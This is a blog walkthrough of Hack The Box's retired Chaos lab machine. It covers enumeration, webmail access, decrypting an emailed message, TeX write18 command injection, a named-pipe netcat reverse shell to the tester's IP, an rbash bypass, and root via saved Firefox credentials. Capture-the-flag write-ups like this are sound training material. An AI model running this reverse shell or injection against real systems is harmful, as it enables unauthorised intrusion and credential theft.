---
layout: post
title: "Chaos: Hack The Box Walkthrough"
date: 2019-05-25 15:09:26 +0000
last_modified_at: 2019-05-25 15:09:56 +0000
category: Walkthrough
tags: ["Hack The Box", Chaos, retired]
comments: true
image:
  feature: chaos-htb-walkthrough.jpg
  credit: 5187396 / Pixabay
  creditlink: https://pixabay.com/en/glitch-glitch-art-distortion-tv-2463383/
---

This post documents the complete walkthrough of Chaos, a retired vulnerable [VM][1] created by [sahay][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Chaos is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `nmap` scan to establish the available services in the host.

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 10.10.10.120
...
PORT      STATE SERVICE  REASON         VERSION
80/tcp    open  http     syn-ack ttl 63 Apache httpd 2.4.34 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.34 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
110/tcp   open  pop3     syn-ack ttl 63 Dovecot pop3d
|_pop3-capabilities: UIDL AUTH-RESP-CODE SASL PIPELINING STLS TOP CAPA RESP-CODES
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
| Issuer: commonName=chaos
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-10-28T10:01:49
| Not valid after:  2028-10-25T10:01:49
| MD5:   af90 2165 92c7 740f d97a 786a 7e9f cb92
|_SHA-1: 5a4d 4223 3b08 a24b 7d5a e509 09bf 9570 aa2c f6ba
|_ssl-date: TLS randomness does not represent time
143/tcp   open  imap     syn-ack ttl 63 Dovecot imapd (Ubuntu)
|_imap-capabilities: OK IDLE capabilities post-login LITERAL+ STARTTLS more LOGIN-REFERRALS have listed Pre-login SASL-IR LOGINDISABLEDA0001 ID ENABLE IMAP4rev1
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
| Issuer: commonName=chaos
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-10-28T10:01:49
| Not valid after:  2028-10-25T10:01:49
| MD5:   af90 2165 92c7 740f d97a 786a 7e9f cb92
|_SHA-1: 5a4d 4223 3b08 a24b 7d5a e509 09bf 9570 aa2c f6ba
|_ssl-date: TLS randomness does not represent time
993/tcp   open  ssl/imap syn-ack ttl 63 Dovecot imapd (Ubuntu)
|_imap-capabilities: OK IDLE capabilities post-login LITERAL+ more LOGIN-REFERRALS have AUTH=PLAINA0001 listed SASL-IR Pre-login ID ENABLE IMAP4rev1
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
| Issuer: commonName=chaos
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-10-28T10:01:49
| Not valid after:  2028-10-25T10:01:49
| MD5:   af90 2165 92c7 740f d97a 786a 7e9f cb92
|_SHA-1: 5a4d 4223 3b08 a24b 7d5a e509 09bf 9570 aa2c f6ba
|_ssl-date: TLS randomness does not represent time
995/tcp   open  ssl/pop3 syn-ack ttl 63 Dovecot pop3d
|_pop3-capabilities: UIDL AUTH-RESP-CODE SASL(PLAIN) PIPELINING USER TOP CAPA RESP-CODES
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
| Issuer: commonName=chaos
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-10-28T10:01:49
| Not valid after:  2028-10-25T10:01:49
| MD5:   af90 2165 92c7 740f d97a 786a 7e9f cb92
|_SHA-1: 5a4d 4223 3b08 a24b 7d5a e509 09bf 9570 aa2c f6ba
|_ssl-date: TLS randomness does not represent time
10000/tcp open  http     syn-ack ttl 63 MiniServ 1.890 (Webmin httpd)
|_http-favicon: Unknown favicon MD5: EA9A0A98E2A16B0ADEA1F6ED448F4CEF
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
```

`nmap` finds `80/tcp`, `110/tcp`, `143/tcp`, `993/tcp`, `995/tcp`, and my oh my `10000/tcp` open. I haven't seen Webmin in a long time. In any case, let's go with the `http` service first. This is how the site looks like.


{% include image.html image_alt="1227280a.png" image_src="/884c1fd7-6418-4f23-b058-2b4324b323a5/1227280a.png" %}


Hmm. Must have something to do with the `Host` request header. Let's map 10.10.10.120 to `chaos.htb` in `/etc/hosts`. Once you have done that, this is how the site looks like.


{% include image.html image_alt="91378288.png" image_src="/884c1fd7-6418-4f23-b058-2b4324b323a5/91378288.png" %}


### Directory/File Enumeration

Let's use `wfuzz` on the site and see what we can find.

```
# wfuzz -w common.txt --hc 404 http://chaos.htb/FUZZ
********************************************************
* Wfuzz 2.3.1 - The Web Fuzzer                         *
********************************************************

Target: http://chaos.htb/FUZZ
Total requests: 4593

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

000010:  C=403     11 L	      32 W	    288 Ch	  ".hta"
000011:  C=403     11 L	      32 W	    293 Ch	  ".htaccess"
000012:  C=403     11 L	      32 W	    293 Ch	  ".htpasswd"
001232:  C=301      9 L	      28 W	    304 Ch	  "css"
002073:  C=301      9 L	      28 W	    304 Ch	  "img"
002094:  C=200    222 L	     550 W	   6964 Ch	  "index.html"
002218:  C=301      9 L	      28 W	    311 Ch	  "javascript"
002250:  C=301      9 L	      28 W	    303 Ch	  "js"
003597:  C=403     11 L	      32 W	    297 Ch	  "server-status"
003758:  C=301      9 L	      28 W	    307 Ch	  "source"

Total time: 93.69892
Processed Requests: 4593
Filtered Requests: 4583
Requests/sec.: 49.01870
```

Wait a tick, there's nothing interesting to see. Maybe because of the virtual host configuration? Let's try `wfuzz` on the IP instead.

```
# wfuzz -w common.txt --hc 404 http://10.10.10.120/FUZZ
********************************************************
* Wfuzz 2.3.1 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.120/FUZZ
Total requests: 4593

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

000011:  C=403     11 L	      32 W	    296 Ch	  ".htaccess"
000012:  C=403     11 L	      32 W	    296 Ch	  ".htpasswd"
000010:  C=403     11 L	      32 W	    291 Ch	  ".hta"
002094:  C=200      1 L	       5 W	     73 Ch	  "index.html"
002218:  C=301      9 L	      28 W	    317 Ch	  "javascript"
003597:  C=403     11 L	      32 W	    300 Ch	  "server-status"
004447:  C=301      9 L	      28 W	    309 Ch	  "wp"

Total time: 93.98760
Processed Requests: 4593
Filtered Requests: 4586
Requests/sec.: 48.86814
```

What do you know? WordPress is installed!

### WordPress Protected Post

This is how the blog looks like. You can see that there's a protected post.


{% include image.html image_alt="e1946bba.png" image_src="/884c1fd7-6418-4f23-b058-2b4324b323a5/e1946bba.png" %}


After much guessing :-1:, the password is `human`. :unamused:


{% include image.html image_alt="1f96aae6.png" image_src="/884c1fd7-6418-4f23-b058-2b4324b323a5/1f96aae6.png" %}


### Webmail

Let's verify the webmail credentials with IMAPS. IMAPS seem to be more likely to be powering webmail. We can use `openssl s_client`, very much like `nc`, to connect to SSL-enabled services.

```
# openssl s_client -crlf -connect 10.10.10.120:993
```


{% include image.html image_alt="0f685e2c.png" image_src="/884c1fd7-6418-4f23-b058-2b4324b323a5/0f685e2c.png" %}


Awesome. The credentials work. Let's `LIST` the mail boxes.


{% include image.html image_alt="225e1fa9.png" image_src="/884c1fd7-6418-4f23-b058-2b4324b323a5/225e1fa9.png" %}


The only mail exists in Drafts.


{% include image.html image_alt="cf4776bc.png" image_src="/884c1fd7-6418-4f23-b058-2b4324b323a5/cf4776bc.png" %}


Let's read the mail.

```
a FETCH 1 BODY[]
* 1 FETCH (BODY[] {2532}
MIME-Version: 1.0
Content-Type: multipart/mixed;
 boundary="=_00b34a28b9033c43ed09c0950f4176e1"
Date: Sun, 28 Oct 2018 17:46:38 +0530
From: ayush <ayush@localhost>
To: undisclosed-recipients:;
Subject: service
Message-ID: <7203426a8678788517ce8d28103461bd@webmail.chaos.htb>
X-Sender: ayush@localhost
User-Agent: Roundcube Webmail/1.3.8

--=_00b34a28b9033c43ed09c0950f4176e1
Content-Transfer-Encoding: 7bit
Content-Type: text/plain; charset=US-ASCII;
 format=flowed

Hii, sahay
Check the enmsg.txt
You are the password XD.
Also attached the script which i used to encrypt.
Thanks,
Ayush

--=_00b34a28b9033c43ed09c0950f4176e1
Content-Transfer-Encoding: base64
Content-Type: application/octet-stream;
 name=enim_msg.txt
Content-Disposition: attachment;
 filename=enim_msg.txt;
 size=272

MDAwMDAwMDAwMDAwMDIzNK7uqnoZitizcEs4hVpDg8z18LmJXjnkr2tXhw/AldQmd/g53L6pgva9
RdPkJ3GSW57onvseOe5ai95/M4APq+3mLp4GQ5YTuRTaGsHtrMs7rNgzwfiVor7zNryPn1Jgbn8M
7Y2mM6I+lH0zQb6Xt/JkhOZGWQzH4llEbyHvvlIjfu+MW5XrOI6QAeXGYTTinYSutsOhPilLnk1e
6Hq7AUnTxcMsqqLdqEL5+/px3ZVZccuPUvuSmXHGE023358ud9XKokbNQG3LOQuRFkpE/LS10yge
+l6ON4g1fpYizywI3+h9l5Iwpj/UVb0BcVgojtlyz5gIv12tAHf7kpZ6R08=
--=_00b34a28b9033c43ed09c0950f4176e1
Content-Transfer-Encoding: base64
Content-Type: text/x-python; charset=us-ascii;
 name=en.py
Content-Disposition: attachment;
 filename=en.py;
 size=804

ZGVmIGVuY3J5cHQoa2V5LCBmaWxlbmFtZSk6CiAgICBjaHVua3NpemUgPSA2NCoxMDI0CiAgICBv
dXRwdXRGaWxlID0gImVuIiArIGZpbGVuYW1lCiAgICBmaWxlc2l6ZSA9IHN0cihvcy5wYXRoLmdl
dHNpemUoZmlsZW5hbWUpKS56ZmlsbCgxNikKICAgIElWID1SYW5kb20ubmV3KCkucmVhZCgxNikK
CiAgICBlbmNyeXB0b3IgPSBBRVMubmV3KGtleSwgQUVTLk1PREVfQ0JDLCBJVikKCiAgICB3aXRo
IG9wZW4oZmlsZW5hbWUsICdyYicpIGFzIGluZmlsZToKICAgICAgICB3aXRoIG9wZW4ob3V0cHV0
RmlsZSwgJ3diJykgYXMgb3V0ZmlsZToKICAgICAgICAgICAgb3V0ZmlsZS53cml0ZShmaWxlc2l6
ZS5lbmNvZGUoJ3V0Zi04JykpCiAgICAgICAgICAgIG91dGZpbGUud3JpdGUoSVYpCgogICAgICAg
ICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICAgICAgY2h1bmsgPSBpbmZpbGUucmVhZChjaHVu
a3NpemUpCgogICAgICAgICAgICAgICAgaWYgbGVuKGNodW5rKSA9PSAwOgogICAgICAgICAgICAg
ICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICBlbGlmIGxlbihjaHVuaykgJSAxNiAhPSAwOgog
ICAgICAgICAgICAgICAgICAgIGNodW5rICs9IGInICcgKiAoMTYgLSAobGVuKGNodW5rKSAlIDE2
KSkKCiAgICAgICAgICAgICAgICBvdXRmaWxlLndyaXRlKGVuY3J5cHRvci5lbmNyeXB0KGNodW5r
KSkKCmRlZiBnZXRLZXkocGFzc3dvcmQpOgogICAgICAgICAgICBoYXNoZXIgPSBTSEEyNTYubmV3
KHBhc3N3b3JkLmVuY29kZSgndXRmLTgnKSkKICAgICAgICAgICAgcmV0dXJuIGhhc2hlci5kaWdl
c3QoKQoK
--=_00b34a28b9033c43ed09c0950f4176e1--
)
a OK Fetch completed (0.002 + 0.000 + 0.001 secs).
```

There are two attachments to the email: an encrypted message and an incomplete Python encryptor code.

<div class="filename"><span>en.py</span></div>

```python
def encrypt(key, filename):
    chunksize = 64*1024
    outputFile = "en" + filename
    filesize = str(os.path.getsize(filename)).zfill(16)
    IV =Random.new().read(16)

    encryptor = AES.new(key, AES.MODE_CBC, IV)

    with open(filename, 'rb') as infile:
        with open(outputFile, 'wb') as outfile:
            outfile.write(filesize.encode('utf-8'))
            outfile.write(IV)

            while True:
                chunk = infile.read(chunksize)

                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - (len(chunk) % 16))

                outfile.write(encryptor.encrypt(chunk))

def getKey(password):
            hasher = SHA256.new(password.encode('utf-8'))
            return hasher.digest()

```

It's not difficult to write a `decrypt` function, once you know where the IV is stored, and the cipher and mode of operation used. Here's the complete code, with the correct imports.

<div class="filename"><span>crypto.py</span></div>

```python
from Crypto import Random
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
import os
import sys

def encrypt(key, filename):
  chunksize = 64 * 1024
  outputFile = "en" + filename
  filesize = str(os.path.getsize(filename)).zfill(16)
  IV =Random.new().read(16)

  encryptor = AES.new(key, AES.MODE_CBC, IV)

  with open(filename, 'rb') as infile:
    with open(outputFile, 'wb') as outfile:
      outfile.write(filesize.encode('utf-8'))
      outfile.write(IV)

      while True:
        chunk = infile.read(chunksize)

        if len(chunk) == 0:
          break
        elif len(chunk) % 16 != 0:
          chunk += b' ' * (16 - (len(chunk) % 16))

        outfile.write(encryptor.encrypt(chunk))


def decrypt(key, filename):
  chunksize = 64 * 1024
  outputFile = filename.split('en')[1]

  with open(filename, 'rb') as infile:
    filesize = int(infile.read(16))
    IV = infile.read(16)
    decryptor = AES.new(key, AES.MODE_CBC, IV)

    with open(outputFile, 'wb') as outfile:
      while True:
        chunk = infile.read(chunksize)

        if len(chunk) == 0:
          break

        outfile.write(decryptor.decrypt(chunk))
      outfile.truncate(filesize)


def getKey(password):
  hasher = SHA256.new(password.encode('utf-8'))
  return hasher.digest()

def usage():
  print "python crypto.py [-e|-d] [filename]"

def main():
  if (len(sys.argv) != 1):
    if (sys.argv[1] == '-e'):
      encrypt(getKey('sahay'), sys.argv[2])
    elif (sys.argv[1] == '-d'):
      decrypt(getKey('sahay'), sys.argv[2])
    else:
      usage()
  else:
    usage()

if __name__ == '__main__':
    main()

```

The message after decryption is a `base64`-encoded message. This is the message after decoding.


{% include image.html image_alt="1844d5e1.png" image_src="/884c1fd7-6418-4f23-b058-2b4324b323a5/1844d5e1.png" %}


## Low-Privilege Shell

This is how the new service looks like.


{% include image.html image_alt="dcd98cfd.png" image_src="/884c1fd7-6418-4f23-b058-2b4324b323a5/dcd98cfd.png" %}


The service creates PDFs based on templates. Digging into the JavaScript, it's obvious that the service creates PDFs based on TeX templates modified through PHP.


{% include image.html image_alt="5b725f83.png" image_src="/884c1fd7-6418-4f23-b058-2b4324b323a5/5b725f83.png" %}


Notice that there's no element with the ID `output`. It's easy to create a `<textarea>` with the ID `output` using jQuery since that's available.

```js
$('body').append('<textarea id="output" style="width: 100%; height: 200px;">')
```

Template 2 and 3 are working. More importantly, a TeX [primitive](https://tex.stackexchange.com/questions/20444/what-are-immediate-write18-and-how-does-one-use-them) `write18` that executes command is exposed.


{% include image.html image_alt="ea9f652d.png" image_src="/884c1fd7-6418-4f23-b058-2b4324b323a5/ea9f652d.png" %}


With that in mind, let's see if our beloved `nc` is available on the host.


{% include image.html image_alt="9e85d97e.png" image_src="/884c1fd7-6418-4f23-b058-2b4324b323a5/9e85d97e.png" %}


Awesome. Too bad, the `-e` is not available. Fret not, we can still make do with something like this.

```
rm -rf /tmp/p; mknod /tmp/p p; /bin/bash 0</tmp/p | nc 10.10.13.52 1234 >/tmp/p
```

True enough, a reverse shell appears on my `nc` listener.


{% include image.html image_alt="1a482f42.png" image_src="/884c1fd7-6418-4f23-b058-2b4324b323a5/1a482f42.png" %}


Let's upgrade the shell with Python's `pty` module and some `stty` magic.


{% include image.html image_alt="f385b4d8.png" image_src="/884c1fd7-6418-4f23-b058-2b4324b323a5/f385b4d8.png" %}


Sweet.

## Privilege Escalation

Now, let's see if we can `su` ourselves to `ayush` with the password `jiujitsu` obtained earlier. Before we do that, know that `ayush`'s default shell is `rbash`.


{% include image.html image_alt="7ee16be4.png" image_src="/884c1fd7-6418-4f23-b058-2b4324b323a5/7ee16be4.png" %}


We can always bypass `rbash` like this.


{% include image.html image_alt="2d24e98b.png" image_src="/884c1fd7-6418-4f23-b058-2b4324b323a5/2d24e98b.png" %}


The `user.txt` is at `ayush`'s home directory.


{% include image.html image_alt="2bf5173c.png" image_src="/884c1fd7-6418-4f23-b058-2b4324b323a5/2bf5173c.png" %}


During enumeration of `ayush`'s account, I noticed the presence of a Mozilla Firefox profile, complete with saved logins to the Webmin interface.


{% include image.html image_alt="ae902700.png" image_src="/884c1fd7-6418-4f23-b058-2b4324b323a5/ae902700.png" %}


The saved credentials are protected by a master password. I copied the entire profile to a new profile on my attacking machine. And, since this is `ayush`'s Firefox profile, the master password is `jiujitsu` as well.

The `root` password can be seen after the unlock.


{% include image.html image_alt="6e3bb466.png" image_src="/884c1fd7-6418-4f23-b058-2b4324b323a5/6e3bb466.png" %}


With the `root` password, we can `su` to `root` and retrieve `root.txt` like so.


{% include image.html image_alt="42acf4fa.png" image_src="/884c1fd7-6418-4f23-b058-2b4324b323a5/42acf4fa.png" %}


:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/167
[2]: https://www.hackthebox.eu/home/users/profile/27390
[3]: https://www.hackthebox.eu/
